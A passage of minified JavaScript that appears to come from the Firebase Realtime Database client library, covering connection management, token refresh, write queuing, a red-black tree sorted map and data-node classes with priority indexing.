"+t),e={p:e},r&&(e.q=n,e.t=r),this.sendRequest("n",e)},Yt.prototype.onDisconnectPut=function(e,t,n){this.initConnection_(),this.connected_?this.sendOnDisconnect_("o",e,t,n):this.onDisconnectRequestQueue_.push({pathString:e,action:"o",data:t,onComplete:n})},Yt.prototype.onDisconnectMerge=function(e,t,n){this.initConnection_(),this.connected_?this.sendOnDisconnect_("om",e,t,n):this.onDisconnectRequestQueue_.push({pathString:e,action:"om",data:t,onComplete:n})},Yt.prototype.onDisconnectCancel=function(e,t){this.initConnection_(),this.connected_?this.sendOnDisconnect_("oc",e,null,t):this.onDisconnectRequestQueue_.push({pathString:e,action:"oc",data:null,onComplete:t})},Yt.prototype.sendOnDisconnect_=function(e,t,n,r){n={p:t,d:n},this.log_("onDisconnect "+e,n),this.sendRequest(e,n,(function(e){r&&setTimeout((function(){r(e.s,e.d)}),Math.floor(0))}))},Yt.prototype.put=function(e,t,n,r){this.putInternal("p",e,t,n,r)},Yt.prototype.merge=function(e,t,n,r){this.putInternal("m",e,t,n,r)},Yt.prototype.putInternal=function(e,t,n,r,i){this.initConnection_(),n={p:t,d:n},void 0!==i&&(n.h=i),this.outstandingPuts_.push({action:e,request:n,onComplete:r}),this.outstandingPutCount_++,r=this.outstandingPuts_.length-1,this.connected_?this.sendPut_(r):this.log_("Buffering put: "+t)},Yt.prototype.sendPut_=function(e){var t=this,n=this.outstandingPuts_[e].action,r=this.outstandingPuts_[e].request,i=this.outstandingPuts_[e].onComplete;this.outstandingPuts_[e].queued=this.connected_,this.sendRequest(n,r,(function(r){t.log_(n+" response",r),delete t.outstandingPuts_[e],t.outstandingPutCount_--,0===t.outstandingPutCount_&&(t.outstandingPuts_=[]),i&&i(r.s,r.d)}))},Yt.prototype.reportStats=function(e){var t=this;this.connected_&&(this.log_("reportStats",e={c:e}),this.sendRequest("s",e,(function(e){"ok"!==e.s&&(e=e.d,t.log_("reportStats","Error sending stats: "+e))})))},Yt.prototype.onDataMessage_=function(e){if("r"in e){this.log_("from server: "+N(e));var t=e.r,n=this.requestCBHash_[t];n&&(delete this.requestCBHash_[t],n(e.b))}else{if("error"in e)throw"A server-side error has occurred: "+e.error;"a"in e&&this.onDataPush_(e.a,e.b)}},Yt.prototype.onDataPush_=function(e,t){this.log_("handleServerMessage",e,t),"d"===e?this.onDataUpdate_(t.p,t.d,!1,t.t):"m"===e?this.onDataUpdate_(t.p,t.d,!0,t.t):"c"===e?this.onListenRevoked_(t.p,t.q):"ac"===e?this.onAuthRevoked_(t.s,t.d):"apc"===e?this.onAppCheckRevoked_(t.s,t.d):"sd"===e?this.onSecurityDebugPacket_(t):ce("Unrecognized action received from server: "+N(e)+"\nAre you using the latest client?")},Yt.prototype.onReady_=function(e,t){this.log_("connection ready"),this.connected_=!0,this.lastConnectionEstablishedTime_=(new Date).getTime(),this.handleTimestamp_(e),this.lastSessionId=t,this.firstConnection_&&this.sendConnectStats_(),this.restoreState_(),this.firstConnection_=!1,this.onConnectStatus_(!0)},Yt.prototype.scheduleConnect_=function(e){var t=this;f(!this.realtime_,"Scheduling a connect when we're already connected/ing?"),this.establishConnectionTimer_&&clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=setTimeout((function(){t.establishConnectionTimer_=null,t.establishConnection_()}),Math.floor(e))},Yt.prototype.initConnection_=function(){!this.realtime_&&this.firstConnection_&&this.scheduleConnect_(0)},Yt.prototype.onVisible_=function(e){e&&!this.visible_&&this.reconnectDelay_===this.maxReconnectDelay_&&(this.log_("Window became visible.  Reducing delay."),this.reconnectDelay_=Ht,this.realtime_||this.scheduleConnect_(0)),this.visible_=e},Yt.prototype.onOnline_=function(e){e?(this.log_("Browser went online."),this.reconnectDelay_=Ht,this.realtime_||this.scheduleConnect_(0)):(this.log_("Browser went offline.  Killing connection."),this.realtime_&&this.realtime_.close())},Yt.prototype.onRealtimeDisconnect_=function(){var e;this.log_("data client disconnected"),this.connected_=!1,this.realtime_=null,this.cancelSentTransactions_(),this.requestCBHash_={},this.shouldReconnect_()&&(this.visible_?this.lastConnectionEstablishedTime_&&(3e4<(new Date).getTime()-this.lastConnectionEstablishedTime_&&(this.reconnectDelay_=Ht),this.lastConnectionEstablishedTime_=null):(this.log_("Window isn't visible.  Delaying reconnect."),this.reconnectDelay_=this.maxReconnectDelay_,this.lastConnectionAttemptTime_=(new Date).getTime()),e=(new Date).getTime()-this.lastConnectionAttemptTime_,e=Math.max(0,this.reconnectDelay_-e),e=Math.random()*e,this.log_("Trying to reconnect in "+e+"ms"),this.scheduleConnect_(e),this.reconnectDelay_=Math.min(this.maxReconnectDelay_,1.3*this.reconnectDelay_)),this.onConnectStatus_(!1)},Yt.prototype.establishConnection_=function(){return o(this,void 0,void 0,(function(){var e,t,n,r,i,o,s,l,h,c,p=this;return a(this,(function(a){switch(a.label){case 0:if(!this.shouldReconnect_())return[3,4];this.log_("Making a connection attempt"),this.lastConnectionAttemptTime_=(new Date).getTime(),this.lastConnectionEstablishedTime_=null,e=this.onDataMessage_.bind(this),t=this.onReady_.bind(this),n=this.onRealtimeDisconnect_.bind(this),r=this.id+":"+Yt.nextConnectionId_++,c=this.lastSessionId,i=!1,o=null,s=function(){o?o.close():(i=!0,n())},h=function(e){f(o,"sendRequest call when we're not connected not allowed."),o.sendRequest(e)},this.realtime_={close:s,sendRequest:h},l=this.forceTokenRefresh_,this.forceTokenRefresh_=!1,a.label=1;case 1:return a.trys.push([1,3,,4]),[4,Promise.all([this.authTokenProvider_.getToken(l),this.appCheckTokenProvider_.getToken(l)])];case 2:return h=u.apply(void 0,[a.sent(),2]),l=h[0],h=h[1],i?Ee("getToken() completed but was canceled"):(Ee("getToken() completed. Creating connection."),this.authToken_=l&&l.accessToken,this.appCheckToken_=h&&h.token,o=new ft(r,this.repoInfo_,this.applicationId_,this.appCheckToken_,this.authToken_,e,t,n,(function(e){ke(e+" ("+p.repoInfo_.toString()+")"),p.interrupt("server_kill")}),c)),[3,4];case 3:return c=a.sent(),this.log_("Failed to get token: "+c),i||(this.repoInfo_.nodeAdmin&&ke(c),s()),[3,4];case 4:return[2]}}))}))},Yt.prototype.interrupt=function(e){Ee("Interrupting connection for reason: "+e),this.interruptReasons_[e]=!0,this.realtime_?this.realtime_.close():(this.establishConnectionTimer_&&(clearTimeout(this.establishConnectionTimer_),this.establishConnectionTimer_=null),this.connected_&&this.onRealtimeDisconnect_())},Yt.prototype.resume=function(e){Ee("Resuming connection for reason: "+e),delete this.interruptReasons_[e],D(this.interruptReasons_)&&(this.reconnectDelay_=Ht,this.realtime_||this.scheduleConnect_(0))},Yt.prototype.handleTimestamp_=function(e){e-=(new Date).getTime(),this.onServerInfoUpdate_({serverTimeOffset:e})},Yt.prototype.cancelSentTransactions_=function(){for(var e=0;e<this.outstandingPuts_.length;e++){var t=this.outstandingPuts_[e];t&&"h"in t.request&&t.queued&&(t.onComplete&&t.onComplete("disconnect"),delete this.outstandingPuts_[e],this.outstandingPutCount_--)}0===this.outstandingPutCount_&&(this.outstandingPuts_=[])},Yt.prototype.onListenRevoked_=function(e,t){t=t?t.map((function(e){return Re(e)})).join("$"):"default",(t=this.removeListen_(e,t))&&t.onComplete&&t.onComplete("permission_denied")},Yt.prototype.removeListen_=function(e,t){var n,r=new Tt(e).toString();return this.listens.has(r)?(n=(e=this.listens.get(r)).get(t),e.delete(t),0===e.size&&this.listens.delete(r)):n=void 0,n},Yt.prototype.onAuthRevoked_=function(e,t){Ee("Auth token revoked: "+e+"/"+t),this.authToken_=null,this.forceTokenRefresh_=!0,this.realtime_.close(),"invalid_token"!==e&&"permission_denied"!==e||(this.invalidAuthTokenCount_++,3<=this.invalidAuthTokenCount_&&(this.reconnectDelay_=3e4,this.authTokenProvider_.notifyForInvalidToken()))},Yt.prototype.onAppCheckRevoked_=function(e,t){Ee("App check token revoked: "+e+"/"+t),this.appCheckToken_=null,this.forceTokenRefresh_=!0,"invalid_token"!==e&&"permission_denied"!==e||(this.invalidAppCheckTokenCount_++,3<=this.invalidAppCheckTokenCount_&&this.appCheckTokenProvider_.notifyForInvalidToken())},Yt.prototype.onSecurityDebugPacket_=function(e){this.securityDebugCallback_?this.securityDebugCallback_(e):"msg"in e&&console.log("FIREBASE: "+e.msg.replace("\n","\nFIREBASE: "))},Yt.prototype.restoreState_=function(){var e,t,n,r;this.tryAuth(),this.tryAppCheck();try{for(var i=s(this.listens.values()),o=i.next();!o.done;o=i.next()){var a=o.value;try{for(var u=(n=void 0,s(a.values())),l=u.next();!l.done;l=u.next()){var h=l.value;this.sendListen_(h)}}catch(t){n={error:t}}finally{try{l&&!l.done&&(r=u.return)&&r.call(u)}finally{if(n)throw n.error}}}}catch(t){e={error:t}}finally{try{o&&!o.done&&(t=i.return)&&t.call(i)}finally{if(e)throw e.error}}for(var c=0;c<this.outstandingPuts_.length;c++)this.outstandingPuts_[c]&&this.sendPut_(c);for(;this.onDisconnectRequestQueue_.length;){var p=this.onDisconnectRequestQueue_.shift();this.sendOnDisconnect_(p.action,p.pathString,p.data,p.onComplete)}for(c=0;c<this.outstandingGets_.length;c++)this.outstandingGets_[c]&&this.sendGet_(c)},Yt.prototype.sendConnectStats_=function(){var e={};e["sdk.js."+re.replace(/\./g,"-")]=1,w()?e["framework.cordova"]=1:"object"==typeof navigator&&"ReactNative"===navigator.product&&(e["framework.reactnative"]=1),this.reportStats(e)},Yt.prototype.shouldReconnect_=function(){var e=Ct.getInstance().currentlyOnline();return D(this.interruptReasons_)&&e},Yt.nextPersistentConnectionId_=0,Yt.nextConnectionId_=0,Yt);function Yt(e,t,n,r,i,o,a,s){var u=Vt.call(this)||this;if(u.repoInfo_=e,u.applicationId_=t,u.onDataUpdate_=n,u.onConnectStatus_=r,u.onServerInfoUpdate_=i,u.authTokenProvider_=o,u.appCheckTokenProvider_=a,u.authOverride_=s,u.id=Yt.nextPersistentConnectionId_++,u.log_=Ie("p:"+u.id+":"),u.interruptReasons_={},u.listens=new Map,u.outstandingPuts_=[],u.outstandingGets_=[],u.outstandingPutCount_=0,u.outstandingGetCount_=0,u.onDisconnectRequestQueue_=[],u.connected_=!1,u.reconnectDelay_=Ht,u.maxReconnectDelay_=3e5,u.securityDebugCallback_=null,u.lastSessionId=null,u.establishConnectionTimer_=null,u.visible_=!1,u.requestCBHash_={},u.requestNumber_=0,u.realtime_=null,u.authToken_=null,u.appCheckToken_=null,u.forceTokenRefresh_=!1,u.invalidAuthTokenCount_=0,u.invalidAppCheckTokenCount_=0,u.firstConnection_=!0,u.lastConnectionAttemptTime_=null,u.lastConnectionEstablishedTime_=null,s&&!C())throw new Error("Auth override specified in options, but not supported on non Node.js platforms");return Bt.getInstance().on("visible",u.onVisible_,u),-1===e.host.indexOf("fblocal")&&Ct.getInstance().on("online",u.onOnline_,u),u}var Kt=(Gt.Wrap=function(e,t){return new Gt(e,t)},Gt);function Gt(e,t){this.name=e,this.node=t}var $t,Jt,Xt=(Zt.prototype.getCompare=function(){return this.compare.bind(this)},Zt.prototype.indexedValueChanged=function(e,t){return e=new Kt(Pe,e),t=new Kt(Pe,t),0!==this.compare(e,t)},Zt.prototype.minPost=function(){return Kt.MIN},Zt);function Zt(){}function en(){return null!==Jt&&Jt.apply(this,arguments)||this}var tn=new(te=(r(en,Jt=Xt),Object.defineProperty(en,"__EMPTY_NODE",{get:function(){return $t},set:function(e){$t=e},enumerable:!1,configurable:!0}),en.prototype.compare=function(e,t){return xe(e.name,t.name)},en.prototype.isDefinedOn=function(e){throw _("KeyIndex.isDefinedOn not expected to be called.")},en.prototype.indexedValueChanged=function(e,t){return!1},en.prototype.minPost=function(){return Kt.MIN},en.prototype.maxPost=function(){return new Kt(Ne,$t)},en.prototype.makePost=function(e,t){return f("string"==typeof e,"KeyIndex indexValue must always be a string."),new Kt(e,$t)},en.prototype.toString=function(){return".key"},en)),nn=(rn.prototype.getNext=function(){if(0===this.nodeStack_.length)return null;var e=this.nodeStack_.pop(),t=this.resultGenerator_?this.resultGenerator_(e.key,e.value):{key:e.key,value:e.value};if(this.isReverse_)for(e=e.left;!e.isEmpty();)this.nodeStack_.push(e),e=e.right;else for(e=e.right;!e.isEmpty();)this.nodeStack_.push(e),e=e.left;return t},rn.prototype.hasNext=function(){return 0<this.nodeStack_.length},rn.prototype.peek=function(){if(0===this.nodeStack_.length)return null;var e=this.nodeStack_[this.nodeStack_.length-1];return this.resultGenerator_?this.resultGenerator_(e.key,e.value):{key:e.key,value:e.value}},rn);function rn(e,t,n,r,i){void 0===i&&(i=null),this.isReverse_=r,this.resultGenerator_=i,this.nodeStack_=[];for(var o=1;!e.isEmpty();)if(o=t?n(e.key,t):1,r&&(o*=-1),o<0)e=this.isReverse_?e.left:e.right;else{if(0===o){this.nodeStack_.push(e);break}this.nodeStack_.push(e),e=this.isReverse_?e.right:e.left}}var on=(an.prototype.copy=function(e,t,n,r,i){return new an(null!=e?e:this.key,null!=t?t:this.value,null!=n?n:this.color,null!=r?r:this.left,null!=i?i:this.right)},an.prototype.count=function(){return this.left.count()+1+this.right.count()},an.prototype.isEmpty=function(){return!1},an.prototype.inorderTraversal=function(e){return this.left.inorderTraversal(e)||!!e(this.key,this.value)||this.right.inorderTraversal(e)},an.prototype.reverseTraversal=function(e){return this.right.reverseTraversal(e)||e(this.key,this.value)||this.left.reverseTraversal(e)},an.prototype.min_=function(){return this.left.isEmpty()?this:this.left.min_()},an.prototype.minKey=function(){return this.min_().key},an.prototype.maxKey=function(){return this.right.isEmpty()?this.key:this.right.maxKey()},an.prototype.insert=function(e,t,n){var r=this,i=n(e,r.key);return(r=i<0?r.copy(null,null,null,r.left.insert(e,t,n),null):0===i?r.copy(null,t,null,null,null):r.copy(null,null,null,null,r.right.insert(e,t,n))).fixUp_()},an.prototype.removeMin_=function(){if(this.left.isEmpty())return ln.EMPTY_NODE;var e=this;return(e=(e=e.left.isRed_()||e.left.left.isRed_()?e:e.moveRedLeft_()).copy(null,null,null,e.left.removeMin_(),null)).fixUp_()},an.prototype.remove=function(e,t){var n,r=this;if(t(e,r.key)<0)r=(r=r.left.isEmpty()||r.left.isRed_()||r.left.left.isRed_()?r:r.moveRedLeft_()).copy(null,null,null,r.left.remove(e,t),null);else{if(0===t(e,(r=(r=r.left.isRed_()?r.rotateRight_():r).right.isEmpty()||r.right.isRed_()||r.right.left.isRed_()?r:r.moveRedRight_()).key)){if(r.right.isEmpty())return ln.EMPTY_NODE;n=r.right.min_(),r=r.copy(n.key,n.value,null,null,r.right.removeMin_())}r=r.copy(null,null,null,null,r.right.remove(e,t))}return r.fixUp_()},an.prototype.isRed_=function(){return this.color},an.prototype.fixUp_=function(){var e=this;return(e=(e=e.right.isRed_()&&!e.left.isRed_()?e.rotateLeft_():e).left.isRed_()&&e.left.left.isRed_()?e.rotateRight_():e).left.isRed_()&&e.right.isRed_()?e.colorFlip_():e},an.prototype.moveRedLeft_=function(){var e=this.colorFlip_();return e.right.left.isRed_()?(e=(e=e.copy(null,null,null,null,e.right.rotateRight_())).rotateLeft_()).colorFlip_():e},an.prototype.moveRedRight_=function(){var e=this.colorFlip_();return e.left.left.isRed_()?(e=e.rotateRight_()).colorFlip_():e},an.prototype.rotateLeft_=function(){var e=this.copy(null,null,an.RED,null,this.right.left);return this.right.copy(null,null,this.color,e,null)},an.prototype.rotateRight_=function(){var e=this.copy(null,null,an.RED,this.left.right,null);return this.left.copy(null,null,this.color,null,e)},an.prototype.colorFlip_=function(){var e=this.left.copy(null,null,!this.left.color,null,null),t=this.right.copy(null,null,!this.right.color,null,null);return this.copy(null,null,!this.color,e,t)},an.prototype.checkMaxDepth_=function(){var e=this.check_();return Math.pow(2,e)<=this.count()+1},an.prototype.check_=function(){if(this.isRed_()&&this.left.isRed_())throw new Error("Red node has red child("+this.key+","+this.value+")");if(this.right.isRed_())throw new Error("Right child of ("+this.key+","+this.value+") is red");var e=this.left.check_();if(e!==this.right.check_())throw new Error("Black depths differ");return e+(this.isRed_()?0:1)},an.RED=!0,an.BLACK=!1,an);function an(e,t,n,r,i){this.key=e,this.value=t,this.color=null!=n?n:an.RED,this.left=null!=r?r:ln.EMPTY_NODE,this.right=null!=i?i:ln.EMPTY_NODE}function sn(){}sn.prototype.copy=function(e,t,n,r,i){return this},sn.prototype.insert=function(e,t,n){return new on(e,t,null)},sn.prototype.remove=function(e,t){return this},sn.prototype.count=function(){return 0},sn.prototype.isEmpty=function(){return!0},sn.prototype.inorderTraversal=function(e){return!1},sn.prototype.reverseTraversal=function(e){return!1},sn.prototype.minKey=function(){return null},sn.prototype.maxKey=function(){return null},sn.prototype.check_=function(){return 0},sn.prototype.isRed_=function(){return!1},gt=sn;var un,ln=(hn.prototype.insert=function(e,t){return new hn(this.comparator_,this.root_.insert(e,t,this.comparator_).copy(null,null,on.BLACK,null,null))},hn.prototype.remove=function(e){return new hn(this.comparator_,this.root_.remove(e,this.comparator_).copy(null,null,on.BLACK,null,null))},hn.prototype.get=function(e){for(var t,n=this.root_;!n.isEmpty();){if(0===(t=this.comparator_(e,n.key)))return n.value;t<0?n=n.left:0<t&&(n=n.right)}return null},hn.prototype.getPredecessorKey=function(e){for(var t,n=this.root_,r=null;!n.isEmpty();){if(0===(t=this.comparator_(e,n.key))){if(n.left.isEmpty())return r?r.key:null;for(n=n.left;!n.right.isEmpty();)n=n.right;return n.key}t<0?n=n.left:0<t&&(n=(r=n).right)}throw new Error("Attempted to find predecessor key for a nonexistent key.  What gives?")},hn.prototype.isEmpty=function(){return this.root_.isEmpty()},hn.prototype.count=function(){return this.root_.count()},hn.prototype.minKey=function(){return this.root_.minKey()},hn.prototype.maxKey=function(){return this.root_.maxKey()},hn.prototype.inorderTraversal=function(e){return this.root_.inorderTraversal(e)},hn.prototype.reverseTraversal=function(e){return this.root_.reverseTraversal(e)},hn.prototype.getIterator=function(e){return new nn(this.root_,null,this.comparator_,!1,e)},hn.prototype.getIteratorFrom=function(e,t){return new nn(this.root_,e,this.comparator_,!1,t)},hn.prototype.getReverseIteratorFrom=function(e,t){return new nn(this.root_,e,this.comparator_,!0,t)},hn.prototype.getReverseIterator=function(e){return new nn(this.root_,null,this.comparator_,!0,e)},hn.EMPTY_NODE=new gt,hn);function hn(e,t){void 0===t&&(t=hn.EMPTY_NODE),this.comparator_=e,this.root_=t}function cn(e,t){return xe(e.name,t.name)}function pn(e,t){return xe(e,t)}function dn(e){return"number"==typeof e?"number:"+De(e):"string:"+e}var fn,_n,yn,vn,gn=function(e){var t;e.isLeafNode()?(t=e.val(),f("string"==typeof t||"number"==typeof t||"object"==typeof t&&R(t,".sv"),"Priority must be a string or number.")):f(e===un||e.isEmpty(),"priority of unexpected type."),f(e===un||e.getPriority().isEmpty(),"Priority nodes can't have a priority of their own.")},mn=(Object.defineProperty(wn,"__childrenNodeConstructor",{get:function(){return fn},set:function(e){fn=e},enumerable:!1,configurable:!0}),wn.prototype.isLeafNode=function(){return!0},wn.prototype.getPriority=function(){return this.priorityNode_},wn.prototype.updatePriority=function(e){return new wn(this.value_,e)},wn.prototype.getImmediateChild=function(e){return".priority"===e?this.priorityNode_:wn.__childrenNodeConstructor.EMPTY_NODE},wn.prototype.getChild=function(e){return Dt(e)?this:".priority"===St(e)?this.priorityNode_:wn.__childrenNodeConstructor.EMPTY_NODE},wn.prototype.hasChild=function(){return!1},wn.prototype.getPredecessorChildName=function(e,t){return null},wn.prototype.updateImmediateChild=function(e,t){return".priority"===e?this.updatePriority(t):t.isEmpty()&&".priority"!==e?this:wn.__childrenNodeConstructor.EMPTY_NODE.updateImmediateChild(e,t).updatePriority(this.priorityNode_)},wn.prototype.updateChild=function(e,t){var n=St(e);return null===n?t:t.isEmpty()&&".priority"!==n?this:(f(".priority"!==n||1===kt(e),".priority must be the last token in a path"),this.updateImmediateChild(n,wn.__childrenNodeConstructor.EMPTY_NODE.updateChild(Pt(e),t)))},wn.prototype.isEmpty=function(){return!1},wn.prototype.numChildren=function(){return 0},wn.prototype.forEachChild=function(e,t){return!1},wn.prototype.val=function(e){return e&&!this.getPriority().isEmpty()?{".value":this.getValue(),".priority":this.getPriority().val()}:this.getValue()},wn.prototype.hash=function(){var e,t;return null===this.lazyHash_&&(e="",this.priorityNode_.isEmpty()||(e+="priority:"+dn(this.priorityNode_.val())+":"),e+=(t=typeof this.value_)+":",e+="number"==t?De(this.value_):this.value_,this.lazyHash_=le(e)),this.lazyHash_},wn.prototype.getValue=function(){return this.value_},wn.prototype.compareTo=function(e){return e===wn.__childrenNodeConstructor.EMPTY_NODE?1:e instanceof wn.__childrenNodeConstructor?-1:(f(e.isLeafNode(),"Unknown node type"),this.compareToLeafNode_(e))},wn.prototype.compareToLeafNode_=function(e){var t=typeof e.value_,n=typeof this.value_,r=wn.VALUE_TYPE_ORDER.indexOf(t),i=wn.VALUE_TYPE_ORDER.indexOf(n);return f(0<=r,"Unknown leaf type: "+t),f(0<=i,"Unknown leaf type: "+n),r===i?"object"==n?0:this.value_<e.value_?-1:this.value_===e.value_?0:1:i-r},wn.prototype.withIndex=function(){return this},wn.prototype.isIndexed=function(){return!0},wn.prototype.equals=function(e){return e===this||!!e.isLeafNode()&&this.value_===e.value_&&this.priorityNode_.equals(e.priorityNode_)},wn.VALUE_TYPE_ORDER=["object","boolean","number","string"],wn);function wn(e,t){void 0===t&&(t=wn.__childrenNodeConstructor.EMPTY_NODE),this.value_=e,this.priorityNode_=t,this.lazyHash_=null,f(void 0!==this.value_&&null!==this.value_,"LeafNode shouldn't be created with null/undefined value."),gn(this.priorityNode_)}function Cn(){return null!==vn&&vn.apply(this,arguments)||this}var bn=new(r(Cn,vn=Xt),Cn.prototype.compare=function(e,t){var n=e.node.getPriority(),r=t.node.getPriority();return 0===(r=n.compareTo(r))?xe(e.name,t.name):r},Cn.prototype.isDefinedOn=function(e){return!e.getPriority().isEmpty()},Cn.prototype.indexedValueChanged=function(e,t){return!e.getPriority().equals(t.getPriority())},Cn.prototype.minPost=function(){return Kt.MIN},Cn.prototype.maxPost=function(){return new Kt(Ne,new mn("[PRIORITY-POST]",yn))},Cn.prototype.makePost=function(e,t){return e=_n(e),new Kt(t,new mn("[PRIORITY-POST]",e))},Cn.prototype.toString=function(){return".priority"},Cn),Tn=Math.log(2),En=(In.prototype.nextBitIsOne=function(){var e=!(this.bits_&1<<this.current_);return this.current_--,e},In);function In(e){var t;this.count=(t=e+1,parseInt(Math.log(t)/Tn,10)),this.current_=this.count-1;var n,r=(n=this.count,parseInt(Array(n+1).join("1"),2));this.bits_=e+1&r}var Sn,kn,Pn=function(e,t,n,r){e.sort(t);var i=function(t,r){if(0==(o=r-t))return null;if(1==o)return a=e[t],s=n?n(a):a,new on(s,a.node,on.BLACK,null,null);var o=parseInt(o/2,10)+t,a=(t=i(t,o),r=i(o+1,r),e[o]),s=n?n(a):a;return new on(s,a.node,on.BLACK,t,r)},o=function(t){for(var r=null,o=null,a=e.length,s=function(t,r){var o=a-t,s=a;a-=t,t=i(1+o,s),s=e[o],o=n?n(s):s,u(new on(o,s.node,r,null,t))},u=function(e){r=r?r.left=e:o=e},l=0;l<t.count;++l){var h=t.nextBitIsOne(),c=Math.pow(2,t.count-(l+1));h?s(c,on.BLACK):(s(c,on.BLACK),s(c,on.RED))}return o}(new En(e.length));return new ln(r||t,o)},Nn={},xn=(Object.defineProperty(Rn,"Default",{get:function(){return f(bn,"ChildrenNode.ts has not been loaded"),Sn=Sn||new Rn({".priority":Nn},{".priority":bn})},enumerable:!1,configurable:!0}),Rn.prototype.get=function(e){var t=O(this.indexes_,e);if(!t)throw new Error("No index defined for "+e);return t instanceof ln?t:null},Rn.prototype.hasIndex=function(e){return R(this.indexSet_,e.toString())},Rn.prototype.addIndex=function(e,t){f(e!==tn,"KeyIndex always exists and isn't meant to be added to the IndexMap.");for(var n=[],r=!1,o=t.getIterator(Kt.Wrap),a=o.getNext();a;)r=r||e.isDefinedOn(a.node),n.push(a),a=o.getNext();var s=r?Pn(n,e.getCompare()):Nn,u=e.toString(),l=i({},this.indexSet_);return l[u]=e,(t=i({},this.indexes_))[u]=s,new Rn(t,l)},Rn.prototype.addToIndexes=function(e,t){var n=this;return new Rn(A(this.indexes_,(function(r,i){var o=O(n.indexSet_,i);if(f(o,"Missing index implementation for "+i),r===Nn){if(o.isDefinedOn(e.node)){for(var a=[],s=t.getIterator(Kt.Wrap),u=s.getNext();u;)u.name!==e.name&&a.push(u),u=s.getNext();return a.push(e),Pn(a,o.getCompare())}return Nn}return o=r,(o=(i=t.get(e.name))?r.remove(new Kt(e.name,i)):o).insert(e,e.node)})),this.indexSet_)},Rn.prototype.removeFromIndexes=function(e,t){return new Rn(A(this.indexes_,(function(n){if(n===Nn)return n;var r=t.get(e.name);return r?n.remove(new Kt(e.name,r)):n})),this.indexSet_)},Rn);function Rn(e,t){this.indexes_=e,this.indexSet_=t}var On,Dn=(Object.defineProperty(An,"EMPTY_NODE",{get:function(){return kn=kn||new An(new ln(pn),null,xn.Default)},enumerable:!1,configurable:!0}),An.prototype.isLeafNode=function(){return!1},An.prototype.getPriority=function(){return this.priorityNode_||kn},An.prototype.updatePriority=function(e){return this.children_.isEmpty()?this:new An(this.children_,e,this.indexMap_)},An.prototype.getImmediateChild=function(e){return".priority"===e?this.getPriority():null===(e=this.children_.get(e))?kn:e},An.prototype.getChild=function(e){var t=St(e);return null===t?this:this.getImmediateChild(t).getChild(Pt(e))},An.prototype.hasChild=function(e){return null!==this.children_.get(e)},An.prototype.updateImmediateChild=function(e,t){if(f(t,"We should always be passing snapshot nodes"),".priority"===e)return this.updatePriority(t);var n=new Kt(e,t),r=void 0,i=t.isEmpty()?(r=this.children_.remove(e),this.indexMap_.removeFromIndexes(n,this.children_)):(r=this.children_.insert(e,t),this.indexMap_.addToIndexes(n,this.children_));n=r.isEmpty()?kn:this.priorityNode_;return new An(r,n,i)},An.prototype.updateChild=function(e,t){var n=St(e);return null===n?t:(f(".priority"!==St(e)||1===kt(e),".priority must be the last token in a path"),t=this.getImmediateChild(n).updateChild(Pt(e),t),this.updateImmediateChild(n,t))},An.prototype.isEmpty=function(){return this.children_.isEmpty()},An.prototype.numChildren=function(){return this.children_.count()},An.prototype.val=function(e){if(this.isEmpty())return null;var t={},n=0,r=0,i=!0;if(this.forEachChild(bn,(function(o,a){t[o]=a.val(e),n++,i&&An.INTEGER_REGEXP_.test(o)?r=Math.max(r,Number(o)):i=!1})),!e&&i&&r<2*n){var o,a=[];for(o in t)a[o]=t[o];return a}return e&&!this.getPriority().isEmpty()&&(t[".priority"]=this.getPriority().val()),t},An.prototype.hash=function(){var e;return null===this.lazyHash_&&(e="",this.getPriority().isEmpty()||(e+="priority:"+dn(this.getPriority().val())+":"),this.forEachChild(bn,(function(t,n){""!==(n=n.hash())&&(e+=":"+t+":"+n)})),this.lazyHash_=""===e?"":le(e)),this.lazyHash_},An.prototype.getPredecessorChildName=function(e,t,n){return(n=this.resolveIndex_(n))?(t=n.getPredecessorKey(new Kt(e,t)))?t.name:null:this.children_.getPredecessorKey(e)},An.prototype.getFirstChildName=function(e){return(e=this.resolveIndex_(e))?(e=e.minKey())&&e.name:this.children_.minKey()},An.prototype.getFirstChild=function(e){return(e=this.getFirstChildName(e))?new Kt(e,this.children_.get(e)):null},An.prototype.getLastChildName=function(e){return(e=this.resolveIndex_(e))?(e=e.maxKey())&&e.name:this.children_.maxKey()},An.prototype.getLastChild=function(e){return(e=this.getLastChildName(e))?new Kt(e,this.children_.get(e)):null},An.prototype.forEachChild=function(e,t){return(e=this.resolveIndex_(e))?e.inorderTraversal((function(e){return t(e.name,e.node)})):this.children_.inorderTraversal(t)},An.prototype.getIterator=function(e){return this.getIteratorFrom(e.minPost(),e)},An.prototype.getIteratorFrom=function(e,t){var n=this.resolveIndex_(t);if(n)return n.getIteratorFrom(e,(function(e){return e}));for(var r=this.children_.getIteratorFrom(e.name,Kt.Wrap),i=r.peek();null!=i&&t.compare(i,e)<0;)r.getNext(),i=r.peek();return r},An.prototype.getReverseIterator=function(e){return this.getReverseIteratorFrom(e.maxPost(),e)},An.prototype.getReverseIteratorFrom=function(e,t){var n=this.resolveIndex_(t);if(n)return n.getReverseIteratorFrom(e,(function(e){return e}));for(var r=this.children_.getReverseIteratorFrom(e.name,Kt.Wrap),i=r.peek();null!=i&&0<t.compare(i,e);)r.getNext(),i=r.peek();return r},An.prototype.compareTo=function(e){return this.isEmpty()?e.isEmpty()?0:-1:e.isLeafNode()||e.isEmpty()?1:e===Mn?-1:0},An.prototype.withIndex=function(e){return e===tn||this.indexMap_.hasIndex(e)?this:(e=this.indexMap_.addIndex(e,this.children_),new An(this.children_,this.priorityNode_,e))},An.prototype.isIndexed=function(e){return e===tn||this.indexMap_.hasIndex(e)},An.prototype.equals=function(e){if(e===this)return!0;if(e.isLeafNode())return!1;if(this.getPriority().equals(e.getPriority())){if(this.children_.count()!==e.children_.count())return!1;for(var t=this.getIterator(bn),n=e.getIterator(bn),r=t.getNext(),i=n.getNext();r&&i;){if(r.name!==i.name||!r.node.equals(i.node))return!1;r=t.getNext(),i=n.getNext()}return null===r&&null===i}return!1},An.prototype.resolveIndex_=function(e){return e===tn?null:this.indexMap_.get(e.toString())},An.INTEGER_REGEXP_=/^(0|[1-9]\d*)$/,An);function An(e,t,n){this.children_=e,this.priorityNode_=t,this.indexMap_=n,this.lazyHash_=null,this.priorityNode_&&gn(this.priorityNode_),this.children_.isEmpty()&&f(!this.priorityNode_||this.priorityNode_.isEmpty(),"An empty node cannot have a priority")}function Ln(){return On.call(this,new ln(pn),Dn.EMPTY_NODE,xn.Default)||this}var Mn=new(r(Ln,On=Dn),Ln.prototype.compareTo=function(e){return e===this?0:1},Ln.prototype.equals=function(e){return 